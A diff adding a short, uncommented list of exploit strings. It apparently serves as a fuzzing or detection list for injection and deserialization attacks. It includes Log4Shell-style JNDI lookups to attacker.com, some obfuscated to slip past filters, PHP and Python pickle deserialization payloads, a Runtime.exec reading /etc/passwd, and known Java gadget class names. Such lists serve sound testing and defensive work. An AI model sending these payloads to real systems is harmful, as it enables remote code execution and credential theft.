@@ -1,0 +1,16 @@
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+${jndi:ldap://attacker.com/x}
+${jndi:rmi://attacker.com:1099/x}
+${${lower:j}ndi:${lower:l}dap://attacker.com}
+${::-j}ndi:rmi://attacker.com
+x=${jndi:dns://x.attacker.com}
+O:8:"stdClass":0:{}
+O:32:"Monolog_Handler_SyslogHandler":0:{}
+gASVYAAAAAAAAACAAAAAAAAAAIwCAAAAAmVjaG8gZXZpbA==
+def __reduce__(self): return os.system, ('id',)
+Runtime.getRuntime().exec("cat /etc/passwd")
+org.apache.commons.collections.functors.InvokerTransformer
+com.sun.rowset.JdbcRowSetImpl
+org.apache.naming.factory.BeanFactory
+org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+ysoserial.CommonsCollections1
